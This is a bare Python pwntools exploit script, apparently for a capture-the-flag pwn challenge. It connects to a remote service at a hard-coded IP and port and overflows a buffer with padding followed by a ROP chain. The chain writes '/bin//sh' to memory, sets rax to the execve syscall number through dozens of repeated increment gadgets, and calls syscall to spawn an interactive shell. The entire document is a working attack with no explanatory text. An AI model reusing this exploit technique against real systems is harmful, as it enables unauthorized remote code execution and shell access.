from pwn import *
from struct import pack

r = remote('45.122.249.68', 2222)
# context.log_level = 'debug'

#gadget
# Padding goes here
p = ''

p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb080) # @ .data
p += pack('<Q', 0x000000000041fd64) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000474d71) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x00000000004269bf) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474d71) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016b6) # pop rdi ; ret
p += pack('<Q', 0x00000000006cb080) # @ .data
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x00000000004431f6) # pop rdx ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x00000000004269bf) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000467ef5) # syscall ; ret

#payload
log.info('enter feeling')
r.recvuntil('>')
r.sendline('a'*(0x218-200-8-48) + p)

log.info('enjoy!')
r.recvuntil('>')
r.sendline('2')

r.interactive()
